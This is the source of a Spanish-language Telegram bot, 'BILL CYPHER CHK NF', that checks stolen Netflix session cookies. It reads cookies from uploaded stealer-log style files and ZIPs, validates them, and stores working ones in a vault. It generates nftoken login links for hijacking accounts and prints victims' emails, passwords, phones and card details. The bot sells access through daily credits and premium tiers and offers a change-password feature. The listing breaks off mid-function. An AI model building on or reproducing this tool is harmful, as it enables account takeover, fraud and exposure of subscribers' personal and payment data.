#!/usr/bin/env python3
"""
BILL CYPHER CHK NF — Edition 5G Turbo
• Cero cruce de perfiles (100% Exact Match)
• Sin enlaces rotos (Cero NSES-404)
• Persistencia automática en la nube de Telegram (Anti-Redeploy wipe)
• Tipografía estilizada Sans-Bold Italic
"""

import os
import io
import time
import random
import asyncio
import logging
import tempfile
import zipfile
import json
import re
import functools
import threading
from datetime import date
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

from telegram import (
    Update,
    Document,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    BotCommand,
    BotCommandScopeDefault,
    BotCommandScopeChat,
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telegram.constants import ParseMode
from telegram.error import (
    Conflict,
    RetryAfter,
    TimedOut,
    NetworkError,
    Forbidden,
    BadRequest,
)

import checker
from checker import check_cookie
import stats as stats_tracker
from dashboard import start_dashboard
import mongodb_store

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.WARNING,
)
for _noisy in ("httpx", "telegram", "apscheduler", "httpcore"):
    logging.getLogger(_noisy).setLevel(logging.ERROR)

logger = logging.getLogger(__name__)
logger.setLevel(logging.WARNING)

BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("BOT_TOKEN") or ""
PORT = int(os.environ.get("PORT", 5000))

# ===========================================================================
# 1. PROPIETARIO Y CONFIGURACIÓN
# ===========================================================================
OWNER_ID: int = 5320997298
OWNER_USER: str = "didierJC"
OWNER_URL: str = f"https://t.me/{OWNER_USER}"

def is_admin(uid: int) -> bool:
    return bool(uid and uid == OWNER_ID)

_CHECKER_THREAD_LOCK = threading.Lock()
_ASYNC_VAULT_LOCK = asyncio.Lock()


# ===========================================================================
# 2. TRANSFORMADOR DE TIPOGRAFÍA (Sans-Serif Bold Italic)
# ===========================================================================
def to_bold_italic(text: str) -> str:
    """Convierte texto normal a tipografía Sans-Serif Bold Italic solicitada."""
    res = []
    for ch in text:
        o = ord(ch)
        if 65 <= o <= 90:    # A-Z
            res.append(chr(0x1D63C + (o - 65)))
        elif 97 <= o <= 122: # a-z
            res.append(chr(0x1D656 + (o - 97)))
        elif 48 <= o <= 57:  # 0-9
            res.append(chr(0x1D7EC + (o - 48)))
        else:
            res.append(ch)
    return "".join(res)


# ===========================================================================
# 3. SISTEMA DE CRÉDITOS (15 DIARIOS / SIN PÉRDIDAS)
# ===========================================================================
DAILY_FREE_CREDITS: int = 15
_CREDITS_FILE = Path("credits.json")

def _load_credits() -> dict:
    if _CREDITS_FILE.exists():
        try:
            return json.loads(_CREDITS_FILE.read_text(encoding="utf-8"))
        except Exception:
            return {}
    return {}

def _save_credits(data: dict) -> None:
    try:
        _CREDITS_FILE.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
    except Exception as e:
        logger.warning(f"Error guardando credits.json: {e}")

def get_user_credits_info(uid: int) -> dict:
    if is_admin(uid):
        return {"type": "owner", "credits": "Ilimitado 👑", "can_use": True}

    data = _load_credits()
    user_data = data.get(str(uid), {})
    today_str = date.today().isoformat()

    if user_data.get("is_premium"):
        creds = user_data.get("credits", "unlimited")
        if creds == "unlimited":
            return {"type": "premium", "credits": "Ilimitado ⭐", "can_use": True}
        try:
            c_val = int(creds)
        except ValueError:
            c_val = 0
        return {"type": "premium", "credits": f"{c_val} restantes ⭐", "can_use": c_val > 0, "balance": c_val}

    last_date = user_data.get("last_date", "")
    used_today = user_data.get("used_today", 0)
    if last_date != today_str:
        used_today = 0
        user_data["last_date"] = today_str
        user_data["used_today"] = 0
        data[str(uid)] = user_data
        _save_credits(data)

    remaining = max(0, DAILY_FREE_CREDITS - used_today)
    return {"type": "normal", "credits": f"{remaining}/{DAILY_FREE_CREDITS} hoy", "can_use": remaining > 0, "balance": remaining}

def consume_credit(uid: int) -> bool:
    if is_admin(uid):
        return True

    data = _load_credits()
    user_data = data.setdefault(str(uid), {"is_premium": False})
    today_str = date.today().isoformat()

    if user_data.get("is_premium"):
        creds = user_data.get("credits", "unlimited")
        if creds == "unlimited":
            return True
        try:
            c_val = int(creds)
        except ValueError:
            c_val = 0
        if c_val <= 0:
            return False
        user_data["credits"] = c_val - 1
        data[str(uid)] = user_data
        _save_credits(data)
        return True
    else:
        last_date = user_data.get("last_date", "")
        used_today = user_data.get("used_today", 0)
        if last_date != today_str:
            used_today = 0
            user_data["last_date"] = today_str

        if used_today >= DAILY_FREE_CREDITS:
            return False

        user_data["used_today"] = used_today + 1
        user_data["last_date"] = today_str
        data[str(uid)] = user_data
        _save_credits(data)
        return True

def refund_credit(uid: int) -> None:
    if is_admin(uid):
        return
    data = _load_credits()
    user_data = data.get(str(uid))
    if not user_data:
        return

    if user_data.get("is_premium"):
        creds = user_data.get("credits")
        if creds != "unlimited":
            try:
                user_data["credits"] = int(creds) + 1
            except ValueError:
                pass
    else:
        used_today = user_data.get("used_today", 1)
        user_data["used_today"] = max(0, used_today - 1)

    data[str(uid)] = user_data
    _save_credits(data)

OUT_OF_CREDITS_TEXT = (
    "⚠️ <b>¡Créditos diarios agotados!</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    f"Has alcanzado el límite de <b>{DAILY_FREE_CREDITS} activaciones gratuitas por hoy</b>.\n\n"
    "💎 <i>Para activar acceso Premium o créditos ilimitados, contacta al propietario:</i>\n"
    "━━━━━━━━━━━━━━━━━━━━━━"
)

def out_of_credits_markup() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⭐ Adquirir Premium (@didierJC) ↗️", url=OWNER_URL)],
        [InlineKeyboardButton("🔙 Volver al Panel", callback_data="panel:back")],
    ])


# ===========================================================================
# 4. BAÚL DE COOKIES (SIN DUPLICADOS)
# ===========================================================================
_VAULT_FILE = Path("cookie_vault.json")
_NETFLIX_MARKERS = ("NetflixId", "SecureNetflixId", "nfvdid", "netflix.com")

def _has_netflix_markers(text: str) -> bool:
    return any(m.lower() in text.lower() for m in _NETFLIX_MARKERS)

def extract_core_netflix_id(cookie_str: str) -> str:
    m = re.search(r'(ct%3D[^\s;\n"\'\r]+)', cookie_str, re.IGNORECASE)
    if m:
        return m.group(1).strip()
    m2 = re.search(r'NetflixId\s+([^\s;\n]+)', cookie_str, re.IGNORECASE)
    if not m2:
        m2 = re.search(r'NetflixId=([^\s;\n]+)', cookie_str, re.IGNORECASE)
    if m2:
        val = m2.group(1).strip()
        if "ct%3D" in val:
            return "ct%3D" + val.split("ct%3D", 1)[1]
        return val
    return ""

def _load_vault() -> list[str]:
    if _VAULT_FILE.exists():
        try:
            data = json.loads(_VAULT_FILE.read_text(encoding="utf-8"))
            return [c for c in data if isinstance(c, str) and _has_netflix_markers(c) and not c.startswith("PK")]
        except Exception:
            return []
    return []

def _save_vault(cookies: list[str]) -> None:
    try:
        _VAULT_FILE.write_text(json.dumps(cookies, ensure_ascii=False, indent=2), encoding="utf-8")
    except Exception as e:
        logger.warning(f"Error guardando vault: {e}")

def extract_cookies_from_text_block(text: str) -> list[str]:
    text = text.strip()
    if not text or not _has_netflix_markers(text):
        return []

    if "status: no disponible" in text.lower() and "💻 pc:" not in text.lower():
        return []

    netscape_lines = [
        line.strip() for line in text.splitlines()
        if ".netflix.com" in line.lower() and any(m.lower() in line.lower() for m in _NETFLIX_MARKERS)
    ]
    if netscape_lines and any("netflixid" in l.lower() for l in netscape_lines):
        return ["\n".join(netscape_lines)]

    blocks = split_cookies_from_text(text)
    clean_blocks = []
    for b in blocks:
        b_clean = b.strip()
        lines = [
            l.strip() for l in b_clean.splitlines()
            if ".netflix.com" in l.lower() and any(m.lower() in l.lower() for m in _NETFLIX_MARKERS)
        ]
        if lines and any("netflixid" in l.lower() for l in lines):
            clean_blocks.append("\n".join(lines))
        elif _has_netflix_markers(b_clean):
            clean_blocks.append(b_clean)

    return clean_blocks or ([text] if _has_netflix_markers(text) else [])

def extract_all_cookies_from_bytes(raw_bytes: bytes, filename: str = "") -> list[str]:
    is_zip = filename.lower().endswith(".zip") or raw_bytes.startswith(b"PK\x03\x04")
    extracted_cookies = []

    if is_zip:
        try:
            with zipfile.ZipFile(io.BytesIO(raw_bytes), "r") as zf:
                for info in zf.infolist():
                    if info.is_dir():
                        continue
                    fname = info.filename
                    base = Path(fname).name
                    if base.startswith(("_", ".")) or base.upper() == "_SUMMARY.TXT":
                        continue
                    if Path(fname).suffix.lower() not in COOKIE_EXTENSIONS:
                        continue
                    try:
                        file_data = zf.read(fname)
                        if _is_binary_content(file_data):
                            continue
                        text = file_data.decode("utf-8", errors="replace")
                        if "status: no disponible" in text.lower() and "💻 pc:" not in text.lower():
                            continue
                        extracted_cookies.extend(extract_cookies_from_text_block(text))
                    except Exception:
                        continue
        except Exception as e:
            logger.warning("Error leyendo ZIP: %s", e)
    else:
        text = raw_bytes.decode("utf-8", errors="replace")
        extracted_cookies.extend(extract_cookies_from_text_block(text))

    return extracted_cookies


# ===========================================================================
# 5. GENERACIÓN ROBUSTA DE ENLACES (CERO NSES-404)
# ===========================================================================
def build_official_login_keyboard(result: dict, raw_token: str) -> InlineKeyboardMarkup:
    """
    Construye botones que NUNCA dan NSES-404.
    Usa los enlaces reales de la API o los endpoints universales oficiales de Netflix.
    """
    nft = result.get("nftoken") or {}
    token = raw_token or result.get("netflix_id") or ""

    pc_url = nft.get("pc_url")
    if not pc_url or "/mobile" in pc_url or "/tv" in pc_url:
        pc_url = f"https://www.netflix.com/browse?nftoken={token}"

    mobile_url = nft.get("mobile_url")
    if not mobile_url or "/mobile" in mobile_url:
        mobile_url = f"https://www.netflix.com/browse?nftoken={token}"

    tv_url = nft.get("tv_url")
    if not tv_url or tv_url.endswith("/tv") or "/tv?" in tv_url:
        # /YourAccount abre la cuenta de forma universal en navegadores de Smart TV / Consolas sin 404
        tv_url = f"https://www.netflix.com/YourAccount?nftoken={token}"

    buttons = [
        [
            InlineKeyboardButton("🖥️ 𝙋𝘾 ↗️", url=pc_url),
            InlineKeyboardButton("📱 𝙈𝙤́𝙫𝙞𝙡 ↗️", url=mobile_url),
            InlineKeyboardButton("📺 𝙏𝙑 ↗️", url=tv_url),
        ],
        [
            InlineKeyboardButton("🔄 𝙍𝙀𝙂𝙀𝙉 𝘾𝙊𝙊𝙆𝙄𝙀", callback_data="panel:gencookie"),
            InlineKeyboardButton("🔙 𝙋𝙖𝙣𝙚𝙡", callback_data="panel:back"),
        ]
    ]
    return InlineKeyboardMarkup(buttons)


# ===========================================================================
# 6. BANNER MULTIMEDIA
# ===========================================================================
_BANNER_FILE = Path("banner_id.txt")
BANNER_MEDIA = "banner.mp4"

def _get_banner_source() -> str:
    if _BANNER_FILE.exists():
        val = _BANNER_FILE.read_text(encoding="utf-8").strip()
        if val:
            return val
    return BANNER_MEDIA


# ===========================================================================
# 7. AISLAMIENTO DE SESIÓN Y VERIFICACIÓN
# ===========================================================================
def _clean_checker_session() -> None:
    try:
        import requests
        for name, obj in list(checker.__dict__.items()):
            if isinstance(obj, requests.Session) or hasattr(obj, "cookies"):
                try:
                    obj.cookies.clear()
                except Exception:
                    pass
                if isinstance(obj, requests.Session):
                    try:
                        setattr(checker, name, requests.Session())
                    except Exception:
                        pass
    except Exception:
        pass

def safe_check_cookie_isolated(*args, **kwargs) -> dict:
    with _CHECKER_THREAD_LOCK:
        _clean_checker_session()
        try:
            return check_cookie(*args, **kwargs)
        finally:
            _clean_checker_session()

def normalize_status(raw_status: str, result_dict: dict = None) -> str:
    st = str(raw_status or "").lower().strip()
    if st in ("hit", "live", "valid", "active", "success"):
        return "hit"
    if st in ("free", "sin_plan"):
        return "free"
    if st in ("on_hold", "hold", "espera"):
        return "on_hold"
    return "invalid"


# ── Registro de usuarios ──────────────────────────────────────────────────
_USERS_FILE = Path("users.txt")

def _record_user_id(uid: int) -> None:
    try:
        if not uid:
            return
        existing = set()
        if _USERS_FILE.exists():
            existing = set(_USERS_FILE.read_text(encoding="utf-8").splitlines())
        if str(uid) not in existing:
            with open(_USERS_FILE, "a", encoding="utf-8") as f:
                f.write(f"{uid}\n")
    except Exception:
        pass


# ── Estados globales (Modo 5G) ────────────────────────────────────────────
_PROXY_ADD_STATE: set[int] = set()
_PROXY_SOURCE_STATE: set[int] = set()
_EXECUTOR = ThreadPoolExecutor(max_workers=75)

COOKIE_EXTENSIONS = (".txt", ".json", ".cookie", ".cookies")
COOKIE_MIME_TYPES = {
    "text/plain", "application/json", "text/json",
    "application/octet-stream", "text/csv",
}

BULK_CONCURRENCY = 50

_CANCEL_SESSIONS: set[int] = set()
_ACTIVE_USERS: dict[int, float] = {}
SESSION_TIMEOUT_SEC = 15 * 60
_USER_SESSION: dict[int, int] = {}
_BOT_USERNAME: str = ""
_USER_MODE: dict[int, str] = {}
_USER_DELIVERY: dict[int, str] = {}
_CHANGEPW_STATE: dict[int, dict] = {}
_HITS_STORE: dict[int, tuple[list, int]] = {}
_NAV_STORE: dict[str, dict] = {}
_GEN_LINK_STORE: dict[str, dict] = {}


# ---------------------------------------------------------------------------
# Validaciones de cookies
# ---------------------------------------------------------------------------

_OTHER_SERVICES: dict[str, str] = {
    "accounts.google.com":  "Google",
    "google.com":           "Google",
    ".amazon.com":          "Amazon",
    "amazon.co":            "Amazon",
    "spotify.com":          "Spotify",
    ".facebook.com":        "Facebook",
    "instagram.com":        "Instagram",
    "youtube.com":          "YouTube",
    "disneyplus.com":       "Disney+",
    ".hulu.com":            "Hulu",
    "hbomax.com":           "HBO Max",
    "max.com":              "Max",
    "primevideo.com":       "Prime Video",
    ".apple.com":           "Apple",
    ".microsoft.com":       "Microsoft",
    "twitter.com":          "Twitter/X",
    "x.com":                "Twitter/X",
    "linkedin.com":         "LinkedIn",
    "twitch.tv":            "Twitch",
    "crunchyroll.com":      "Crunchyroll",
    "hotstar.com":          "Hotstar",
}

_BINARY_MAGIC: list[bytes] = [
    b'\xff\xd8\xff', b'\x89PNG', b'GIF8', b'%PDF',
    b'PK\x03\x04', b'\x1f\x8b', b'MZ', b'\x7fELF',
    b'BM', b'ID3', b'\x00\x00\x00',
]

def _wrong_service_name(text: str) -> str | None:
    tl = text.lower()
    for domain, name in _OTHER_SERVICES.items():
        if domain in tl:
            return name
    return None

def _is_binary_content(raw: bytes) -> bool:
    for magic in _BINARY_MAGIC:
        if raw.startswith(magic):
            return True
    sample = raw[:512]
    non_print = sum(1 for b in sample if b < 9 or (13 < b < 32 and b != 10))
    return len(sample) > 0 and non_print / len(sample) > 0.15

def _validate_cookie_text(text: str) -> tuple[bool, str]:
    if not text or len(text.strip()) < 10:
        return False, "El archivo está vacío o es demasiado corto."

    wrong = _wrong_service_name(text)
    if wrong and not _has_netflix_markers(text):
        return False, (
            f"Esto parece ser una cookie de <b>{wrong}</b>, no de Netflix.\n"
            f"Solo se admiten cookies de Netflix (<code>NetflixId</code>, <code>SecureNetflixId</code>)."
        )

    if not _has_netflix_markers(text):
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        sample = lines[0][:80] if lines else text[:80]
        return False, (
            "❌ <b>No se encontraron cookies de Netflix.</b>\n\n"
            "Se requiere cookie <code>NetflixId</code> o <code>SecureNetflixId</code>.\n\n"
            f"<i>El contenido empieza con:</i> <code>{sample}</code>"
        )
    return True, ""


# ---------------------------------------------------------------------------
# Preferencias de usuario
# ---------------------------------------------------------------------------

def _get_mode(user_id: int) -> str:
    return _USER_MODE.get(user_id, "basic")

def _toggle_mode(user_id: int) -> str:
    current = _get_mode(user_id)
    new = "basic" if current == "full" else "full"
    _USER_MODE[user_id] = new
    return new

def _get_delivery(user_id: int) -> str:
    return _USER_DELIVERY.get(user_id, "zip")

def _set_delivery(user_id: int, mode: str) -> None:
    _USER_DELIVERY[user_id] = mode


# ---------------------------------------------------------------------------
# Panel visual principal
# ---------------------------------------------------------------------------

def _main_panel_text(uid: int) -> str:
    mode_lbl = "Full" if _get_mode(uid) == "full" else "Básico"
    dlv_lbl  = "Cards 💬" if _get_delivery(uid) == "cards" else "ZIP 📦"

    cred_info = get_user_credits_info(uid)
    if cred_info["type"] == "owner":
        role_lbl = "👑 Propietario"
    elif cred_info["type"] == "premium":
        role_lbl = "⭐ Premium"
    else:
        role_lbl = "👤 Usuario"

    return (
        "👁️‍🗨️ <b>" + to_bold_italic("BILL CYPHER CHK NF") + "</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"● 👑 <b>" + to_bold_italic("Rol:") + f"</b> {role_lbl}\n"
        f"● 🆔 <b>" + to_bold_italic("ID:") + f"</b> <code>{uid}</code>\n"
        f"● 💎 <b>" + to_bold_italic("Creditos:") + f"</b> <code>{cred_info['credits']}</code>\n"
        f"● ⚙️ <b>" + to_bold_italic("Ajustes:") + f"</b> {mode_lbl} · {dlv_lbl}\n"
        f"● 🟢 <b>" + to_bold_italic("Estado:") + f"</b> Online ⚡ 5G\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ <b>" + to_bold_italic("v2.0") + "</b> | <i>Envía tus cookies o genera una cuenta abajo</i> 👇"
    )

def _main_panel_markup(uid: int) -> InlineKeyboardMarkup:
    admin_buttons = []
    if is_admin(uid):
        vault_count = len(_load_vault())
        admin_buttons = [
            [
                InlineKeyboardButton("🛡️ Proxies [Admin]", callback_data="panel:proxy"),
                InlineKeyboardButton("👥 Usuarios [Admin]", callback_data="panel:users"),
            ],
            [
                InlineKeyboardButton(f"📦 Baúl Stock ({vault_count}) [Admin]", callback_data="panel:vault"),
            ]
        ]

    rows = [
        [
            InlineKeyboardButton("⚡ " + to_bold_italic("GEN COOKIE") + " 🍪", callback_data="panel:gencookie"),
        ],
        [
            InlineKeyboardButton("⚙️ Configuración", callback_data="panel:settings"),
            InlineKeyboardButton("📊 Estadísticas", callback_data="panel:info"),
        ],
        [
            InlineKeyboardButton("📖 Formatos", callback_data="panel:help"),
            InlineKeyboardButton("🔐 Cambiar PW", callback_data="panel:changepw"),
        ],
        *admin_buttons,
    ]
    return InlineKeyboardMarkup(rows)

def _panel_back_markup() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Volver al Panel", callback_data="panel:back")]
    ])

async def _send_banner_panel(update: Update, text: str, markup: InlineKeyboardMarkup) -> None:
    target = update.message or (update.callback_query.message if update.callback_query else None)
    if not target:
        return

    banner_source = _get_banner_source()

    if len(banner_source) > 30 or banner_source.startswith("http"):
        try:
            await target.reply_video(
                video=banner_source,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=markup,
                supports_streaming=True,
            )
            return
        except Exception:
            try:
                await target.reply_animation(
                    animation=banner_source,
                    caption=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=markup,
                )
                return
            except Exception:
                pass

    banner_path = Path(banner_source)
    if banner_path.exists():
        ext = banner_path.suffix.lower()
        try:
            with open(banner_path, "rb") as f:
                if ext in (".mp4", ".mov"):
                    await target.reply_video(
                        video=f,
                        caption=text,
                        parse_mode=ParseMode.HTML,
                        reply_markup=markup,
                        supports_streaming=True,
                    )
                    return
                elif ext in (".gif",):
                    await target.reply_animation(
                        animation=f,
                        caption=text,
                        parse_mode=ParseMode.HTML,
                        reply_markup=markup,
                    )
                    return
                elif ext in (".jpg", ".jpeg", ".png", ".webp"):
                    await target.reply_photo(
                        photo=f,
                        caption=text,
                        parse_mode=ParseMode.HTML,
                        reply_markup=markup,
                    )
                    return
        except Exception as e:
            logger.warning("Error enviando banner local: %s", e)

    await target.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)

async def _edit_panel_message(query, text: str, markup: InlineKeyboardMarkup | None = None) -> None:
    try:
        if query.message and query.message.caption is not None:
            await query.edit_message_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=markup)
        else:
            await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
    except Exception as e:
        logger.debug("edit_panel fallback: %s", e)
        try:
            await query.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=markup)
        except Exception:
            pass

def _settings_text(uid: int) -> str:
    mode     = _get_mode(uid)
    delivery = _get_delivery(uid)
    mode_lbl = "📋 Información completa" if mode == "full" else "📄 Básico"
    dlv_lbl  = "💬 Card-by-Card" if delivery == "cards" else "📦 ZIP"
    return (
        "⚙️ <b>Configuración del Bot</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 <b>Formato de salida:</b> {mode_lbl}\n"
        f"📤 <b>Modo de entrega:</b> {dlv_lbl}\n\n"
        "Toca un botón para cambiar tus preferencias:"
    )

def _settings_markup(uid: int) -> InlineKeyboardMarkup:
    mode     = _get_mode(uid)
    delivery = _get_delivery(uid)
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Información completa" if mode == "full" else "📋 Información completa", callback_data=f"setmode:{uid}:full"),
            InlineKeyboardButton("✅ Básico" if mode == "basic" else "📄 Básico", callback_data=f"setmode:{uid}:basic"),
        ],
        [
            InlineKeyboardButton("✅ Modo ZIP" if delivery == "zip" else "📦 Modo ZIP", callback_data=f"setdelivery:{uid}:zip"),
            InlineKeyboardButton("✅ Card-by-Card" if delivery == "cards" else "💬 Card-by-Card", callback_data=f"setdelivery:{uid}:cards"),
        ],
        [
            InlineKeyboardButton("🔙 Volver al Panel", callback_data="panel:back"),
            InlineKeyboardButton("❌ Cerrar", callback_data="closesettings"),
        ],
    ])

def _info_text(uid: int) -> str:
    s = stats_tracker.get_stats()
    total_checks = s.get("total_checks", 0)
    hits         = s.get("total_hits", 0)
    invalids     = s.get("total_invalids", 0)
    errors       = s.get("total_errors", 0)
    frees        = s.get("total_frees", 0)
    on_hold      = s.get("total_on_hold", 0)
    users        = s.get("total_users", 0)
    uptime       = s.get("uptime", "—")
    hit_rate     = s.get("hit_rate", 0)
    cpm          = s.get("checks_per_min", 0)
    active       = len(_ACTIVE_USERS)

    return (
        "📊 <b>Estadísticas en Tiempo Real</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⏱️ <b>Uptime:</b> {uptime}\n"
        f"📦 <b>Total Chequeado:</b> {total_checks}\n"
        f"✅ <b>Hits Activos:</b> {hits} ({hit_rate}%)\n"
        f"⏸️ <b>En Espera:</b> {on_hold}\n"
        f"🔓 <b>Cuentas Free:</b> {frees}\n"
        f"❌ <b>Inválidas:</b> {invalids}\n"
        f"⚠️ <b>Errores:</b> {errors}\n"
        f"👤 <b>Usuarios Únicos:</b> {users}\n"
        f"🔄 <b>Procesos Activos:</b> {active}\n"
        f"🚀 <b>Velocidad:</b> {cpm} checks/min\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

def _help_text() -> str:
    return (
        "📖 <b>Formatos de Cookies Admitidos</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<b>1. Netscape (.txt)</b>\n"
        "<code>.netflix.com  TRUE  /  TRUE  9999  NetflixId  ct%3D…</code>\n\n"
        "<b>2. Pipe-combo (.txt)</b>\n"
        "<code>email:pass | Country=US | NetflixId=ct%3D…</code>\n\n"
        "<b>3. JSON (.json)</b>\n"
        '<code>[{"name":"NetflixId","value":"ct%3D…"}]</code>\n\n'
        "<b>4. Archivo ZIP (.zip)</b>\n"
        "Comprime múltiples archivos <code>.txt</code> o <code>.json</code>.\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "<i>💡 Solo envía el archivo al bot o pega el texto directamente.</i>"
    )

def _cancel_keyboard(msg_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Cancelar", callback_data=f"cancel:{msg_id}")]])


# ---------------------------------------------------------------------------
# Helpers y Formateadores de Resultados
# ---------------------------------------------------------------------------

def _country_display(country: str) -> str:
    flag = _flag(country)
    return f"{country} {flag}".strip() if flag else country

def make_progress_bar(done: int, total: int, width: int = 14) -> str:
    if total == 0:
        return f"[{'▱' * width}] 0%"
    filled = int(width * done / total)
    bar = "▰" * filled + "▱" * (width - filled)
    pct = int(100 * done / total)
    return f"[{bar}] {pct}%"

def _yes_no(val) -> str:
    if val is None:
        return "Desconocido"
    return "Sí" if val else "No"

def _plan_title(plan_name: str, status: str) -> str:
    p = (plan_name or "").lower()
    st = normalize_status(status)
    if st == "free":
        return "🔓 FREE ACCOUNT (Sin Suscripción)"
    if st == "on_hold":
        return "⏸️ CUENTA EN ESPERA (On Hold)"
    if "premium" in p:
        return "🌟 CUENTA PREMIUM 4K"
    if "standard" in p and "ads" in p:
        return "📺 STANDARD CON ANUNCIOS"
    if "standard" in p:
        return "⭐ CUENTA STANDARD"
    if "basic" in p or "base" in p:
        return "📱 CUENTA BÁSICA"
    if "mobile" in p:
        return "📱 CUENTA MÓVIL"
    if st == "hit":
        return "✅ CUENTA VÁLIDA (LIVE)"
    return "❌ CUENTA INVÁLIDA (DEAD)"

def _status_line(status: str, plan: str) -> str:
    p_lower = (plan or "").lower()
    st = normalize_status(status)
    if st == "hit":
        if "premium" in p_lower:
            return "🔥 <b>Status:</b> Válido (Live) — Premium 4K ✅"
        if "standard" in p_lower:
            return "🔥 <b>Status:</b> Válido (Live) — Standard ✅"
        if "basic" in p_lower:
            return "🔥 <b>Status:</b> Válido (Live) — Básica ✅"
        return "🔥 <b>Status:</b> Válido (Live) ✅"
    if st == "free":
        return "🔓 <b>Status:</b> Sin membresía activa"
    if st == "on_hold":
        return "⏸️ <b>Status:</b> En espera (Fallo de pago)"
    return "❌ <b>Status:</b> Muerta (Dead / Inválida)"

def _build_card_line(result: dict) -> str:
    ct = result.get("card_type") or ""
    l4 = result.get("card_last4") or ""
    exp = result.get("card_expiry") or ""
    expired = result.get("card_expired", False)
    partner = result.get("partner_name") or ""
    is_third = result.get("is_third_party", False)

    if is_third and partner:
        return f"{partner} (Facturación por terceros)"
    if ct:
        parts = [ct.upper() if len(ct) <= 10 else ct]
        if l4:
            parts.append(f"···· {l4}")
        if exp:
            flag = " ⚠️EXPIRED" if expired else ""
            parts.append(f"(exp {exp}{flag})")
        return " ".join(parts)
    return result.get("payment") or "Desconocido"

def format_result_basic(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
    status   = normalize_status(result.get("status"), result)
    plan     = result.get("plan_name")    or ""
    email    = result.get("email")        or "Hidden"
    name     = result.get("name")         or ""
    country  = result.get("country")      or "Desconocido"
    quality  = result.get("quality")      or "Desconocido"
    streams  = result.get("max_streams")  or "?"
    price    = result.get("price")        or "Desconocido"
    billing  = result.get("next_billing") or "Desconocido"
    nf_id    = result.get("netflix_id")   or ""
    phone    = result.get("phone")        or ""
    password = result.get("password")     or ""
    issues   = result.get("account_issues") or []
    nft      = result.get("nftoken")

    if not name and "@" in email:
        name = email.split("@")[0].replace(".", " ").title()

    card_line = _build_card_line(result)
    title = _plan_title(plan, status)
    counter = f"  #{index}/{total}" if total > 1 else ""

    lines = [
        f"🎬 <b>{title}{counter}</b>",
        "━━━━━━━━━━━━━━━━━━━━━━",
        _status_line(status, plan),
        "",
        "👤 <b>Account</b>",
    ]
    if name:
        lines.append(f"  • Name: {name}")
    lines.append(f"  • Email: <code>{email}</code>")
    if password:
        lines.append(f"  • Contraseña: <code>{password}</code>")
    if phone:
        lines.append(f"  • Phone: {phone}")

    lines.append("")
    lines.append("📋 <b>Subscription</b>")
    lines.append(f"  • País: {_country_display(country)}")
    lines.append(f"  • Plan: {plan or 'Desconocido'}")
    lines.append(f"  • Calidad: {quality} · {streams} screens")
    lines.append(f"  • Precio: {price}")
    lines.append(f"  • Facturación: {billing}")
    if card_line and card_line not in ("Desconocido", ""):
        lines.append(f"  • Pago: {card_line}")

    prof_names_str = ", ".join(result.get("profile_names") or [])
    if prof_names_str:
        lines.append(f"  • Perfiles ({result.get('profiles', 1)}): {prof_names_str}")

    lines.append("")
    if nf_id:
        lines.append(f"🍪 <code>NetflixId={nf_id}</code>\n")

    if issues:
        lines.append("⚠️ <b>Problemas de la cuenta</b>")
        for issue in issues:
            lines.append(f"  🔴 {issue}")
        lines.append("")

    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
    return "\n".join(lines)

def format_result_full(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
    status  = normalize_status(result.get("status"), result)
    plan    = result.get("plan_name")   or ""
    email   = result.get("email")       or "Hidden"
    name    = result.get("name")        or ""
    password= result.get("password")    or ""
    phone   = result.get("phone")       or ""
    country = result.get("country")     or "Desconocido"
    quality = result.get("quality")     or "Desconocido"
    streams = result.get("max_streams") or "Desconocido"
    price   = result.get("price")       or "Desconocido"
    since   = result.get("member_since") or "Desconocido"
    billing = result.get("next_billing") or "Desconocido"
    payment = result.get("payment")     or "Desconocido"
    nf_id   = result.get("netflix_id")  or ""
    ms_status = result.get("membership_status") or "Desconocido"
    profile_names = result.get("profile_names") or []
    profiles_count = result.get("profiles")
    is_on_hold = result.get("is_on_hold", False)
    num_extra = result.get("num_extra_members", 0)
    email_verified = result.get("email_verified")
    is_free_trial = result.get("is_in_free_trial", False)

    if not name and "@" in email:
        name = email.split("@")[0].replace(".", " ").title()

    card_line = _build_card_line(result)
    title = _plan_title(plan, status)
    counter = f"  #{index}/{total}" if total > 1 else ""

    lines = [
        f"🎬 <b>{title}{counter}</b>",
        "━━━━━━━━━━━━━━━━━━━━━━",
    ]
    if source:
        lines.append(f"📁 <b>Origen:</b> <code>{source}</code>")
    lines.append(_status_line(status, plan))
    lines.append("")
    lines.append("👤 <b>Detalles de la cuenta:</b>")
    if name:
        lines.append(f"  • Name: {name}")
    lines.append(f"  • Email: <code>{email}</code>")
    if password:
        lines.append(f"  • Contraseña: <code>{password}</code>")
    lines.append(f"  • País: {_country_display(country)}")
